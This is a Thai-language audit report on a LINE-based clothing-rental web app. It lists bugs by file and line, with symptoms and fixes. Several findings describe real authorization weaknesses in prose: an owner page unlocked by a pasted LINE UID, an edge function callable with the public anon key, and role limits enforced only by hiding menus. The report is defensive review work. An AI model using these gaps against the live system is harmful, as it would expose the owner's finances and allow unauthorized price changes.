grep 'forecast.html' ทั้ง repo ไม่พบการอ้างถึงจากไฟล์อื่นเลย (ผลลัพธ์เดียวคือ hr.html:224 ซึ่งเป็นเรื่อง staff.html) — ไม่อยู่ใน OPS_NAV ของ ops-menu.js, ไม่อยู่ใน nav bar ของ cockpit/analytics/settings, topbar ของหน้าเอง (บรรทัด 72) มีแต่ปุ่มย้อนกลับไป index.html (หน้าลูกค้า) · หน้านี้มีฟีเจอร์สำคัญ: ประมาณการ, ดึงตัวเลขจริง, และ 'แก้ราคาแพ็ก — บันทึกเข้าระบบจริง' แต่เจ้าของเข้าถึงได้ทางเดียวคือพิมพ์ URL เอง

**อาการที่ผู้ใช้เจอ:** เจ้าของอยากดูประมาณการ/แก้ราคาแพ็กสมาชิก → เปิดเมนู ☰ และ nav ทุกหน้า ไม่มีทางเข้า forecast.html เลย ฟีเจอร์ทั้งหน้าถูกทิ้งให้ค้นไม่เจอ (ต้องรู้ URL /forecast.html เอง)

**แนวทางแก้:** เพิ่ม { href:'forecast.html', label:'ประมาณการ', roles:['owner'] } ในหมวด 'ธุรกิจ' หรือ 'เจ้าของ' ของ OPS_NAV (หลังแก้ auth ตาม finding ก่อนหน้า)

### 🟡 ย่อย · `analytics.html:490` — ปุ่ม 'ซิงค์ตอนนี้' เรียก edge function analytics-fetch โดยไม่แนบ id_token — ต่างจาก marketing-ai ในหน้าเดียวกัน ใครมี anon key (อยู่ในซอร์ส) ก็สั่งซิงค์ได้

analytics.html:489-491 `fetch(SUPABASE_URL+'/functions/v1/analytics-fetch',{...headers:{'Authorization':'Bearer '+SUPABASE_KEY}, body:'{}'})` — ส่งแค่ publishable key (ซึ่ง public อยู่ในทุกหน้า) ไม่มีข้อมูลระบุตัวผู้ใช้เลย ขณะที่ runAI ในไฟล์เดียวกัน (บรรทัด 412) แนบ `id_token:(window.opsIdToken?window.opsIdToken():'')` ตามแนวทาง gate edge function ที่ ops-api.js:51-52 ระบุไว้ ('id_token ของ staff สำหรับ gate edge functions') — analytics-fetch จึงไม่มีวัตถุดิบให้ server ตรวจ role ได้

**อาการที่ผู้ใช้เจอ:** คนนอก (ไม่ใช่ staff) เปิด devtools ก็อป anon key จากซอร์สแล้ว POST ไป /functions/v1/analytics-fetch ซ้ำ ๆ → สั่งระบบไปดึง Meta Ads API ได้ตามใจ (เสี่ยง rate-limit token ของร้าน / เขียน metrics ซ้ำ) โดยไม่ต้องล็อกอิน LINE

**แนวทางแก้:** แนบ id_token แบบเดียวกับ marketing-ai: body:JSON.stringify({id_token:window.opsIdToken?window.opsIdToken():''}) และให้ edge function verify

### 🟡 ย่อย · `staff.html:202` — ROLE_TH ใน staff.html ไม่ครอบคลุม role หลักที่ hr.html ใช้จริง (manager, hr_admin, care, stock, marketing, accounting) — พอร์ทัลพนักงานโชว์ role เป็นโค้ดดิบ

staff.html:202 `ROLE_TH={admin,stylist,laundry,repair,shipping,sales,owner}` — 7 ค่า ซึ่งเป็นเซ็ตเก่า ขณะที่ hr.html ตั้ง role ได้เป็น owner/manager/hr_admin/care/stock/marketing/accounting/stylist/sales/admin (hr.html:118-129) และ hr.html เองมี ROLE_TH ครบ 13 ค่า (hr.html:232) — บนพอร์ทัล showDashboard บรรทัด 347 render `${ROLE_TH[e.role]||e.role||'-'}` ดังนั้น role ที่ใช้บ่อยที่สุด (care, stock, marketing, manager, hr_admin, accounting) จะ fallback เป็นโค้ดอังกฤษดิบ

**อาการที่ผู้ใช้เจอ:** พนักงานดูแลชุด (role='care') เปิดพอร์ทัล staff.html → ใต้ชื่อขึ้น 'EMP001 · care' แทนที่จะเป็น 'ดูแลชุด' — เพี้ยนกับพนักงานเกือบทุกตำแหน่งที่จ้างผ่าน hr.html และขัดกับที่หน้าลงทุนทำ i18n ไทย/อังกฤษ/พม่า/ลาวทั้งหน้า

**แนวทางแก้:** ใช้เซ็ต ROLE_TH เดียวกับ hr.html:232 (หรือย้ายไปไฟล์ร่วม)


## cross-cutting ทุก role  — กลุ่ม `cross-cutting`

ยืนยัน 8 ประเด็น (verifier หักล้างทิ้ง 0 ข้อ)

### 🔴 วิกฤต · `api.js:69` — API.init() โหมด live อ้าง window.MOCK ที่มาจาก data.js — 4 หน้า (event/join/looks/pay) โหลด api.js โดยไม่โหลด data.js ทำให้ init พังและหน้าตกไปโหมด mock ถาวร

api.js บรรทัด 69 ในเส้นทาง live (USE_MOCK=false ตาม config.js:3): `let customer = window.MOCK.CUSTOMER;` และบรรทัด 111 `OCCASIONS: window.MOCK.OCCASIONS` — window.MOCK ถูกนิยามที่เดียวใน data.js (`window.MOCK = {` data.js:2) ตรวจแล้วไม่มีไฟล์อื่นนิยาม. แต่ event.html (script: config.js, liffAuth.js, me-api.js, api.js:160 — ไม่มี data.js), join.html:176, looks.html:198, pay.html:124 โหลด api.js โดยไม่มี data.js เลย ดังนั้นทุกครั้งที่เรียก window.API.init() (event.html:229, join.html:337, looks.html:218, pay.html:188) จะ throw TypeError 'Cannot read properties of undefined (reading CUSTOMER)' ที่ api.js:69 ก่อนถึงขั้นอ่านโปรไฟล์/แคตตาล็อกจริง. ทุกหน้า catch ไว้แล้ว 'ตกไป mock' (เช่น pay.html:192 `catch(e){ /* ตกไป mock */ }`) จึงไม่เห็น error แต่ LIVE=false ตลอด. เทียบกับ index.html/g.html/family.html/wed.html/group-checkout.html ที่โหลด data.js ครบจึงทำงานได้

**อาการที่ผู้ใช้เจอ:** ลูกค้าที่ล็อกอิน LINE จริงเปิด pay.html เพื่อดูสถานะจ่ายเงินกลุ่ม → API.init() throw → หน้าโชว์ 'โหมดพรีวิว (mock) · เข้าผ่าน LINE จริงเพื่อดึงสถานะจาก Supabase' ทั้งที่เข้าผ่าน LINE จริง จ่าย/เช็กยอดจริงไม่ได้เลย · เพื่อนที่กดลิงก์ชวนเข้ากลุ่มจาก family.html (liff.line.me/.../join.html?token=…) เข้า join.html แล้ว LIVE bootstrap ล้มทุกครั้ง (join.html:344 log 'join LIVE bootstrap failed, fallback mock') → กด 'เข้าร่วม' ได้แค่ demo ไม่ได้เข้ากลุ่มจริง — ฟีเจอร์ชวนเพื่อนพังทั้งวงจร · looks.html ล็อกอินไม่ติด (like/save/follow ไม่ทำงาน) · event.html โชว์ข้อมูลงานปลอมแทนของจริง

**แนวทางแก้:** ใน api.js เปลี่ยนเป็น `const MOCK = window.MOCK || {}; let customer = MOCK.CUSTOMER || {};` และ `OCCASIONS: (window.MOCK && window.MOCK.OCCASIONS) || {}` หรือเพิ่ม <script src="data.js"> ก่อน api.js ใน event.html, join.html, looks.html, pay.html

### 🟠 สำคัญ · `forecast.html:340` — หน้าการเงินเจ้าของ (forecast.html) ข้าม ops-rpc gateway ทั้งหน้า — ใช้ 'LINE UID เจ้าของ' ที่พิมพ์เองเป็นรหัสผ่าน ผ่าน anon key ทั้งอ่านตัวเลขจริงและ 'เขียน' ราคาแผน

forecast.html เป็นหน้าประมาณการรายได้/ตัวเลขจริงของเจ้าของ แต่ไม่โหลด ops-api.js เลย (script: supabase-js, liff sdk, config.js, analytics.js, nav.js) — ต่างจากหน้า ops ทุกหน้าที่วิ่งผ่าน opsRpc (verify id_token ฝั่ง server). กลไก auth ของหน้านี้: บรรทัด 79 มี input 'วาง LINE UID เจ้าของ (ขึ้นต้น U…)' → tryUid() (บรรทัด 422-425) เรียก `client().rpc('forecast_actuals',{p_uid:uid})` ด้วย SUPABASE_ANON_KEY แล้วถ้า data.owner=true ก็ปลดล็อกและ cache UID ลง localStorage ('lloop_owner_uid'). บรรทัด 340 ยังมี write: `client().rpc('update_plan_price',{p_uid:OWNER_UID,p_code,p_price,p_rentals})` — สิทธิ์ทั้งหมดผูกกับการ 'รู้ค่า UID' ที่ส่งเป็น argument ธรรมดา ไม่มี id_token verification ใด ๆ (me-api.js/ops-api.js ออกแบบมาเพื่อกันการ spoof p_uid แบบนี้โดยเฉพาะ ตาม comment me-api.js:1-3)

**อาการที่ผู้ใช้เจอ:** พนักงานหรือคนนอกที่รู้ LINE UID ของเจ้าของ (UID ไม่ใช่ความลับ — โผล่ในหน้าจอ ops/export/แชร์หน้าจอ และถูก cache ใน localStorage เครื่องที่เจ้าของเคยใช้) เปิด forecast.html ในเบราว์เซอร์ใดก็ได้ วาง UID → เห็นรายได้จริง กำไร ต้นทุนทั้งหมด และแก้ราคาเช่าต่อแผนผ่าน update_plan_price ได้ทันที โดยระบบไม่รู้ว่าใครทำ

**แนวทางแก้:** ย้าย forecast_actuals / update_plan_price / plan_economics ไปเรียกผ่าน window.opsRpc (โหลด ops-api.js) แล้วให้ gateway ตัดสิทธิ์ owner_only จาก id_token — เลิกรับ p_uid จาก client และเลิก cache UID ใน localStorage

### 🟠 สำคัญ · `hr.html:122` — คำศัพท์ role ของ HR (13 ค่า) ไม่ตรงกับ role matrix ของ ops-menu (5 ค่า) — พนักงานที่ถูกตั้ง role เป็น hr_admin/accounting/laundry/repair ฯลฯ ได้เมนูว่างเปล่า

hr.html ให้เจ้าของเลือกตำแหน่งพนักงานได้ 13 ค่า: dropdown บรรทัด 118-127 มี owner, manager, hr_admin, care, stock, marketing, accounting (+ ROLE_TH บรรทัด 232 รองรับ stylist, sales, admin, laundry, repair, shipping ด้วย) แต่ ops-menu.js รู้จักแค่ 5 role: ROLE_TH ops-menu.js:52 = {owner,manager,care,stock,marketing} และทุก item ใน OPS_NAV (บรรทัด 8-51) ใช้ roles จาก 5 ค่านี้เท่านั้น. canSee (ops-menu.js:57) ใช้ `item.roles.includes(role)` ตรง ๆ ดังนั้น role นอกลิสต์ match ได้เฉพาะ roles:'*' ซึ่งมีแค่ today.html. home.html:203-215 (MEANING) และ opsRoleTH ก็ fallback เป็น 'พนักงาน'

**อาการที่ผู้ใช้เจอ:** เจ้าของจ้าง 'หัวหน้าฝ่ายบุคคล' แล้วตั้ง role=hr_admin ใน hr.html → คนนั้นล็อกอินเข้า home.html เห็นป้ายตำแหน่ง 'พนักงาน' เมนูมีแค่ 'งานวันนี้' ใบเดียว ไม่เห็นแม้แต่หน้า hr.html ที่เป็นงานหลักของตัวเอง (เมนู HR เปิดให้ roles:['owner'] เท่านั้น — ops-menu.js:44) · ตั้ง role=accounting ก็ไม่เห็นเมนูบัญชี (เมนูบัญชีให้ owner/manager เท่านั้น) — จ้างตำแหน่งเฉพาะทางมาแล้วใช้ระบบไม่ได้ ต้องแจกสิทธิ์ manager เกินจริงแทน

**แนวทางแก้:** sync คำศัพท์ role สองไฟล์: เพิ่ม hr_admin/accounting/laundry/repair ฯลฯ ลง OPS_NAV roles ที่เกี่ยวข้อง (เช่น hr.html ← hr_admin, accounting.html/slips.html ← accounting, laundry.html ← laundry) หรือจำกัด dropdown ใน hr.html ให้เหลือเฉพาะ role ที่ ops-menu รองรับ

### 🟡 ย่อย · `ops-menu.js:35` — Role matrix ใน ops-menu ขัดกับการ enforce จริง: เมนู 'คอกพิตเจ้าของ' เปิดให้ manager แต่ตัวหน้า/ฟังก์ชันประกาศว่า owner-only — และไม่มีหน้า ops ใดตรวจ role ฝั่ง client เลย

ops-menu.js:35 `{ href:'cockpit.html', … roles:['owner','manager'] }` แต่ cockpit.html เรียก `sb.rpc('owner_cockpit')` (cockpit.html:148, comment บรรทัด 74 ระบุ 'gateway (LINE idToken + owner-only)') และ error handler บรรทัด 156 เขียนตายตัวว่า 'เข้าได้เฉพาะเจ้าของ (owner)' — สองไฟล์ในรีโปขัดกันเอง ข้างใดข้างหนึ่งผิดแน่นอน. ภาพรวมกว้างกว่านั้น: ตรวจทุกหน้า ops แล้วไม่มีหน้าไหนเช็ก me.role/is_owner ก่อน render (grep ทั้งรีโปพบ ops_me/is_owner เฉพาะ home.html และ nfc.html ซึ่งใช้แค่โชว์ชื่อ) — การกรอง care/stock/marketing/manager ใน canSee (ops-menu.js:54-58) เป็นแค่การซ่อนเมนู ส่วน ops-api.js:41-42 แสดงว่า gateway แยก error แค่ no_access(ไม่ใช่ staff)/owner_only/fn_not_allowed ไม่มีการแยกระดับ role อื่น และ ops-api.js:51-52 ระบุว่า opsIdToken ใช้ gate edge functions AI (marketing-ai/intake-tagger/repair-advise) ที่ระดับ 'staff' เท่านั้น

**อาการที่ผู้ใช้เจอ:** ผู้จัดการ (manager) เห็นเมนู 'คอกพิตเจ้าของ' กดเข้า → owner_cockpit ตอบ owner_only → เจอ 'โหลดไม่ได้: คำสั่งนี้สำหรับเจ้าของเท่านั้น' จากเมนูที่ระบบยื่นให้เอง (หรือกลับกัน ถ้า fn เปิดให้ manager ข้อความ/ชื่อหน้า owner cockpit ก็หลอกผู้ใช้) · พนักงาน care พิมพ์ URL marketing.html / analytics.html ตรง ๆ → opsLogin ผ่าน (เป็น staff) หน้าโหลดเต็ม และเรียก marketing-ai ได้เพราะ gate เป็นระดับ staff ไม่ใช่ระดับ role

**แนวทางแก้:** ให้ทุกหน้า sensitive เรียก opsMe() แล้วเทียบกับ canSee ของหน้าตัวเองก่อน render (redirect ไป home.html ถ้าไม่ผ่าน) และปรับ gateway ให้ผูก fn→role ตาม matrix เดียวกับ OPS_NAV; แก้ roles ของ cockpit.html ใน OPS_NAV ให้ตรงกับ enforcement จริง

### 🟡 ย่อย · `webhooks.js:3` — webhooks.js เป็น dead code — ไม่มีหน้าไหนโหลดและไม่มีโค้ดไหนเรียก window.webhooks

webhooks.js นิยาม window.webhooks (n8n stubs: orderConfirmed, newArrivals, returnReminder, requestReview — POST ไป CONFIG.N8N_BASE_URL). ตรวจแล้ว: ไม่มี <script src="webhooks.js"> ในไฟล์ .html ใดเลย และ grep 'webhooks' ในไฟล์ .js อื่นทั้งหมดไม่พบผู้เรียกแม้แต่จุดเดียว (exit 1) — ต่อให้ตั้ง N8N_BASE_URL ใน config.js (ตอนนี้ว่าง, config.js:9) webhook เหล่านี้ก็ไม่มีวันยิง

**อาการที่ผู้ใช้เจอ:** ทีมตั้งค่า n8n แล้วใส่ N8N_BASE_URL คาดว่าระบบจะ broadcast ของเข้าใหม่/เตือนวันคืน/ขอรีวิวอัตโนมัติ — แต่ไม่มีอะไรเกิดขึ้นเลยเพราะไม่มีโค้ดเส้นทางไหนเรียกฟังก์ชันพวกนี้

**แนวทางแก้:** ลบ webhooks.js ทิ้ง หรือโหลดในหน้า flow ที่เกี่ยวข้อง (slips.html หลัง approve สลิป → orderConfirmed, intake.html → newArrivals, laundry.html → requestReview) แล้วเรียกใช้จริง

### 🟡 ย่อย · `analytics.js:31` — ชั้น analytics ไม่มีวันยิง event: gaEvents/analyticsTrack/analyticsIdentify ไม่ถูกเรียกจากไฟล์ใดเลย และ 3 หน้าโหลด analytics.js โดยไม่มี config.js ทำให้ GA init ไม่ได้แม้ตั้งค่า GA4_ID แล้ว

สองชั้นซ้อนกัน: (1) grep ทั้งรีโปพบ gaEvents/analyticsTrack/analyticsIdentify เฉพาะใน analytics.js เอง — helper อย่าง contractViewed/contractSigned/checkoutStart ที่เขียนไว้เพื่อหน้า contract/checkout ไม่ถูกเรียกสักที่ (2) privacy.html และ rental-terms.html โหลด analytics.js โดยไม่โหลด config.js เลย ส่วน contract.html ตั้ง `window.CONFIG=window.CONFIG||{}` เอง (contract.html:102) โดยไม่มี GA4_ID — analytics.js:4-5 `var id = window.CONFIG && window.CONFIG.GA4_ID; if (!id || id==='G-XXXXXXXXXX') return;` จึง return ทันที: ต่อให้วันหน้าใส่ Measurement ID จริงใน config.js หน้าเหล่านี้ก็ยังเก็บ page_view ไม่ได้

**อาการที่ผู้ใช้เจอ:** ทีมการตลาดใส่ GA4 Measurement ID ใน config.js แล้วรอดู funnel — หน้า contract (จุด conversion สำคัญ: เปิดอ่าน/ลงนามสัญญา), privacy, rental-terms ไม่ส่งข้อมูลเข้า GA เลย และ event เชิงธุรกิจ (contract_signed, begin_checkout, wishlist_*) เป็นศูนย์ทุกหน้า ทำให้อ่านรายงานแล้วเข้าใจผิดว่าไม่มีคนใช้

**แนวทางแก้:** เพิ่ม <script src="config.js"> ก่อน analytics.js ใน privacy.html / rental-terms.html / contract.html และเรียก gaEvents.* ตามจุด flow จริง (หรือถ้าไม่ใช้ GA แล้ว ลบชั้น gaEvents ออก)

### 🟡 ย่อย · `wed.html:53` — wed.html โหลด nav.js แต่ไม่มี .lloop-topbar placeholder และไม่มี data-i18n เลย — ไม่มีปุ่มกลับ/สลับภาษา หลุดจากระบบ i18n ที่หน้า customer อื่นมีครบ

wed.html:53 โหลด nav.js?v=1 แต่ grep ทั้งไฟล์ไม่พบ `lloop-topbar`, `data-i18n`, หรือ `NAV.t` แม้แต่ครั้งเดียว (count data-i18n = 0 เทียบกับ family.html 38, review.html 28, group-checkout.html 21) — nav.js จึง inject แค่ CSS แล้วไม่ทำอะไร. ข้อความทั้งหน้า hardcode ไทยล้วน (เช่น 'ชวนเพื่อนเช่าชุดเข้างานเดียวกัน' บรรทัด 85) ขณะที่หน้าพี่น้องใน flow เดียวกันมี topbar+TH/EN ครบ (g.html:95, pay.html:101)

**อาการที่ผู้ใช้เจอ:** ลูกค้าที่ตั้งภาษา EN ไว้ (localStorage lloop_lang='en') กดลิงก์แชร์งานแต่งเข้า wed.html → ทั้งหน้าเป็นไทยล้วน ไม่มีตัวสลับภาษา ไม่มีปุ่มกลับหน้าหลัก ต่างจากทุกหน้าอื่นในเว็บ — และโหลด nav.js เสียเปล่าโดยไม่ได้ผลลัพธ์อะไร

**แนวทางแก้:** เพิ่ม `<header class="lloop-topbar" data-back="index.html" data-back-th="หน้าหลัก" data-back-en="Home"></header>` ต้น <body> และใส่ data-i18n/NAV.t ให้ข้อความหลัก (หรือถ้าตั้งใจให้ไทยล้วน ให้ถอด nav.js ออก)

### 🟡 ย่อย · `ops-api.js:5` — คอมเมนต์ template ใน ops-api.js ยังสอนให้โหลด '../liff/config.js' ที่ไม่มีอยู่แล้ว — เป็นต้นตอที่จะผลิตบั๊กแบบ settings.html ซ้ำในหน้า ops ใหม่

ops-api.js:4-5 (วิธี convert หน้า ops): `<script src="../liff/config.js"></script><script src="ops-api.js"></script>` — path ../liff/ เป็นโครงสร้างเก่าก่อนย้ายไฟล์มา root ปัจจุบันไม่มีโฟลเดอร์ liff/ ใน repo. นี่คือมิติใหม่ของบั๊ก settings.html:186 ที่รู้อยู่แล้ว: settings.html คือหน้าที่ copy ตาม comment นี้ตรง ๆ และ comment ยังชี้ผิดอยู่ ใครสร้างหน้า ops ถัดไปตามคู่มือนี้จะได้ 404 config.js อีก (หน้าไม่ตายทันทีเพราะ ops-api.js:10,12 มี fallback SUPABASE_URL/OPS_LIFF_ID hardcode แต่ค่าอื่นใน CONFIG จะหายทั้งหมด)

**อาการที่ผู้ใช้เจอ:** นักพัฒนาสร้างหน้า ops ใหม่ตาม 'วิธี convert' ใน header ของ ops-api.js → โหลด ../liff/config.js ที่ 404 → window.CONFIG undefined ทั้งหน้า เหมือนที่เกิดกับ settings.html แล้วหนึ่งครั้ง

**แนวทางแก้:** แก้ comment เป็น `<script src="config.js"></script>` ให้ตรงโครงสร้างปัจจุบัน (และแก้ settings.html:186 ตามบั๊กที่รายงานไว้แล้ว)

---

## ประเด็นจากรอบเช็คเบื้องต้น (นอกเหนือจาก 8 ทีม)

### 🔴 วิกฤต · `settings.html:186` — โหลด `../liff/config.js` ที่ไม่มีแล้ว

หลังย้ายไฟล์จาก `liff/` มา root path นี้ 404 → หน้า "ตั้งค่าฮับ" ของ owner ไม่มี `window.CONFIG` ให้ `ops-api.js` ใช้ **แนวทางแก้:** เปลี่ยนเป็น `<script src="config.js"></script>` และแก้ comment template ใน `ops-api.js:5` ด้วย

### 🟠 สำคัญ · `accounting.html:196` — ปุ่ม "พิมพ์" ใบกำกับชี้ `tax-doc.html` ที่ไม่มีไฟล์ใน repo (404 ทุกใบ)

### 🟡 ย่อย · `about.html:9` — og:image ชี้โดเมนเก่า `lloop-studio.github.io/liff/og-cover.jpg` (แชร์หน้า About แล้วรูป preview พัง/เป็นแบรนด์เก่า)

---

## Coverage ของแต่ละทีม

- **customer-core**: อ่านเต็มทุกบรรทัด: index.html (1407), app.js (ครบ 3931 บรรทัด อ่านเป็นช่วง), api.js (1117), config.js, liffAuth.js, me-api.js, i18n.js, data.js, brands.js, pixel.js, analytics.js, promptpay.js, nav.js, home.html, shop.html + อ่านประกอบ ops-api.js, ops-menu.js (role gating ของ home.html) · grep ยืนยัน cross-file: gaEvents call sites, rate_1d/status columns, my_rentals fields, ../liff & lloop-studio paths, ไฟล์ปลายทางลิงก์ทุกตัวในเมนู (quiz/wishlist/looks/creator/family/about/rental-terms/privacy/th-postal.json — มีจริงครบ) · DOM wiring ตรวจ onclick/getElementById ทุกฟังก์ชันใน sheet ที่ app.js สร้าง — ครบ ไม่พบ undefined function
- **customer-secondary**: อ่านเต็มไฟล์: wishlist.html, review.html, looks.html, quiz.html, pay.html, g.html, care-label.html, ig-card.html, about.html, contract.html (ส่วน markup+script ทั้งหมด, ข้าม CSS ต้นไฟล์), links.html (ส่วน markup+script, ข้าม CSS 1-280), rental-terms.html (hero+section 1-4, 9-10, footer/script — ข้าม CSS และ section กลางที่เป็น legal text ล้วน), privacy.html (skim — static legal, ตรวจ script/footer/hero) และไฟล์ dependency: config.js, data.js, me-api.js, nav.js, liffAuth.js, promptpay.js, analytics.js, ops-api.js, ops-menu.js เต็มไฟล์ + api.js แบบเจาะส่วน (init, quote, bookCart, group*, payInfo, community/looks ทั้ง block, return list) · ตรวจ broken refs ด้วย grep ทุก href/src local, ตรวจ id ซ้ำทุกหน้า, ตรวจ handler ของ app.js (?go=stylist, ?garment, ?date, ?look, ?ref)
- **group-flows**: อ่านเต็มทั้ง 4 ไฟล์เป้าหมาย: family.html (982 บรรทัด, อ่านครบ 2 รอบต่อกัน), wed.html (171, ครบ), event.html (385, ครบ), group-checkout.html (1056, อ่านครบ 2 ช่วง). อ่านประกอบ: api.js เต็มช่วง init (1-120), stylist/available (190-310), group/wed ทั้งบล็อก (620-840) และ export line 1115 — ยืนยันทุก method ที่ 4 หน้าเรียก (groupEventStatus, wedShare*, bookGroupCart/Split, groupThemeSuggest, joinGroup ฯลฯ) มีจริง+action name RPC ตรง (group_event_status, wed_share_pick, book_group_split ...); me-api.js อ่านเต็ม; config.js อ่านเต็ม (USE_MOCK=false); nav.js, data.js, promptpay.js ตรวจแบบ grep เฉพาะจุด (data-i18n ใช้ innerHTML, window.MOCK อยู่ data.js:2 ที่เดียว, promptpayBrandedQR มีจริง); ตรวจไฟล์ปลายทางทุก href/script src ว่ามีใน repo root ครบ (g.html, join.html, family.html, index.html, data.js, promptpay.js). ฝั่ง backend (Supabase RPC/GAS) ไม่อยู่ใน repo จึงตรวจได้เฉพาะ contract ฝั่ง client — status strings ที่ backend คืน (เช่น kyc_required/unavailable ใน split result) verify ไม่ได้ จึงไม่รายงาน"
- **partner**: อ่านเต็มทุกบรรทัด: partner.html (1281), join.html (383), ops-partner.html (541), me-api.js (64), ops-api.js (55), ops-menu.js (135), nav.js (123), liffAuth.js (49), config.js. อ่านบางส่วนแบบเจาะจง: api.js (init, joinGroup/groupInvitePreview, stylistDirectory/stylistPublic/pcBookSlot, exports), app.js (stylist picker ~2490-2570 + จุดใช้ bust_in/height_cm), settings.html/contracts.html/hr.html เฉพาะบรรทัดที่ grep เจอ. ตรวจอัตโนมัติ: duplicate id ทั้ง 3 หน้า (ไม่พบ), path ค้าง ../liff/ และโดเมน lloop-studio (ไม่พบในกลุ่มนี้), ไฟล์ที่อ้างถึงทุกตัวมีจริงใน repo root. ยืนยันแล้วว่า buildPayload↔fillForm ของ partner.html/ops-partner.html field ครบตรงกันทุกคีย์ และหน่วยวัด (นิ้ว/ซม./กก.) สอดคล้อง save↔load↔app.js. RPC action names ฝั่ง backend (Supabase functions) ไม่อยู่ใน repo จึงตรวจได้แค่ฝั่ง client
- **ops-care-stock**: อ่านเต็มทุกบรรทัด: today.html, laundry.html, shipout.html, intake.html, putaway.html, repair.html, nfc.html, stock.html, garment.html, seller.html, labels.html, csv.html, scan.js, qc-photo.js, ops-api.js, ops-menu.js, ops-ui.css, config.js · skim/grep ประกอบ: api.js, app.js (routeDeepLink), g.html (param handling), laundry-shops.html (script loads), care-label.html, index.html — ตรวจ href/src ทุกไฟล์ local ในกลุ่มแล้วมีไฟล์อยู่จริงครบ (laundry-shops.html, care-label.html, market.html ฯลฯ) ไม่พบ path ../liff/ หรือโดเมน lloop-studio ค้างในกลุ่มนี้ (มีแค่ใน comment ops-api.js:5) · script order ทุกหน้าถูก (config→ops-api→qc-photo/scan ก่อนใช้, scan.js โหลดครบทุกหน้าที่เรียก scanInto: laundry/putaway/laundry-shops, qc-photo.js โหลดครบใน laundry/shipout) · ไม่พบ id ซ้ำในหน้าเดียว/onclick ชี้ฟังก์ชันที่ไม่มี · ไม่รายงาน bug ที่รู้แล้ว (settings.html, accounting.html, about.html)
- **ops-marketing**: อ่านเต็มทุกบรรทัด: marketing.html, live.html, influencers.html, ugc.html, ops-looks.html, market.html, requests.html, creator.html, laundry-shops.html รวมทั้งไฟล์ประกอบ ops-api.js, me-api.js, ops-menu.js, config.js, scan.js (เต็ม) · อ่านบางส่วนแบบเจาะจง: nav.js (topbar/i18n/NAV.t — ยืนยัน creator.html ใช้ data-i18n/NAV.t/lloop:lang ถูกต้อง), ops-ui.css (grep คลาส .bar/.kpi/.li/.res/.pin/.flash/.phead มีครบ แต่ .lbrow/.lav/.lnm ไม่มี), wishlist.html บรรทัด 560-870 (ยืนยัน flow ลูกค้าสร้าง request จริงผ่าน submit_garment_request และ field brand/item_description/size/occasion/budget_max/reference_url/reference_image_url/ops_note/status/notified_at ตรงกับที่ requests.html render ครบ รวมถึงค่า occasion filter ตรงกับ option ฝั่งลูกค้าเป๊ะ และสถานะ pending/sourcing/added/rejected ตรงกันสองฝั่ง), looks.html (เฉพาะบล็อก .lbrow). สรุป auth layering: creator.html = me-api (LIFF ลูกค้า 2010486714-1g6lDuHo, actions gig_board/gig_claim/ugc_submit + ugc-audit ส่ง id_token) ส่วน laundry-shops.html = ops-api (LIFF ops 2010486714-lDr0nzy0 ผ่าน ops-rpc, actions wash_send/care_wash_done/put_away/laundry_vendors_list/laundry_vendor_upsert/laundry_vendor_set_active/bins_list/care_queue) — laundry-shops ไม่ใช่หน้า self-service ของร้านนอก แต่เป็นหน้า staff (ลิงก์จาก laundry.html) และไม่อยู่ใน OPS_NAV. backend allowlist (ops-rpc/me-rpc functions) ไม่อยู่ใน repo จึงตรวจชื่อ action ฝั่ง server ไม่ได้ ตรวจได้แค่ความสม่ำเสมอของ layer ซึ่งถูกต้องทุกหน้า ยกเว้น live-broadcast/market-scan ที่ไม่แนบ id_token (รายงานแล้ว). broken reference: ทุก href/src ในไฟล์กลุ่มนี้ชี้ไฟล์ที่มีจริงใน repo root ไม่พบ ../liff/ หรือโดเมนเก่านอกเหนือ known bugs"
- **ops-owner**: อ่านเต็มทุกบรรทัด: cockpit.html, analytics.html, analytics.js, accounting.html, slips.html, purchasing.html, contracts.html, branches.html, hr.html (2 รอบเพราะยาว 800 บรรทัด), stylist-bookings.html, disputes.html, case-file.html, settings.html, forecast.html, staff.html (2 รอบ 661 บรรทัด) รวมถึง dependency ที่หน้าเหล่านี้โหลด: ops-api.js, ops-menu.js, me-api.js, config.js (อ่านเต็ม) · skim แบบ targeted-grep: nav.js (NAV.t/data-i18n/lloop-topbar/setLang), ops-ui.css (.kpi.ok/.bad/.phead — ยืนยันว่า hero ROAS class 'ok' ของ analytics.html มีสไตล์จริง ไม่ใช่บั๊ก) · grep ยืนยันข้ามไฟล์: การอ้างถึง forecast.html/staff.html ทั้ง repo (forecast กำพร้าจริง), opsMenu.mount ในทุกหน้า ops (accounting/slips ขาดจริง), path ../liff และ /liff/ ที่ค้าง, โดเมน lloop-studio · ไม่รายงานซ้ำ known bugs (settings.html:186, tax-doc.html, about.html og:image) · สิ่งที่ตรวจแล้วไม่พบปัญหา: DOM id/onclick ของทุกหน้า wire ครบ, ชื่อ RPC สอดคล้องรูปแบบ p_* ทั่วทั้งชุด, slips.html RES mapping มี fallback, contract status pills ครบทุกค่า (draft/sent/viewed/signed/declined/void), init race ของ LIFF ถูกกันด้วย _initP ใน ops-api.js
- **cross-cutting**: อ่านเต็มทุกไฟล์ .js ใน root: config.js, liffAuth.js, ops-api.js, ops-menu.js, me-api.js, nav.js, i18n.js, analytics.js, pixel.js, webhooks.js, qc-photo.js, scan.js, promptpay.js (data.js/brands.js อ่านหัวไฟล์+exports; api.js อ่านโครง+ช่วง init เต็ม+grep RPC/status ทั้งไฟล์; app.js ใช้ grep เชิงลึก th-postal/I18N/LiffAuth/DOM-id ไม่ได้อ่านทั้ง 316KB). HTML: สแกน script-src ทุกหน้า (56 ไฟล์) + สคริปต์อัตโนมัติตรวจ broken refs / duplicate id / onclick handler / getElementById ทุกหน้า; อ่านเชิงลึก forecast, partner, home, cockpit, accounting, case-file, contracts, contract, review, hr, family, wed, links, stock, requests, และช่วง boot ของ event/join/looks/pay; หน้า ops ที่เหลือ (laundry, shipout, intake, putaway, marketing, live ฯลฯ) ตรวจเฉพาะ pattern auth/rpc/สถานะผ่าน grep. ตรวจแล้วไม่พบปัญหา: th-postal.json format ตรงกับผู้ใช้ทั้งสอง (app.js, partner.html), ลิงก์ทุกรายการใน OPS_NAV ชี้ไฟล์ที่มีจริง, ไม่มี id ซ้ำ/handler หาย, ลำดับโหลด qrcode→promptpay และ ops-api→qc-photo ถูกต้องทุกหน้า, i18n.js ถูกใช้เฉพาะ index.html/app.js ตามออกแบบ. ไม่ได้ยืนยันฝั่ง server (edge functions ไม่อยู่ในรีโป) — ประเด็น role enforcement รายงานเฉพาะส่วนที่ขัดกันเองในรีโป
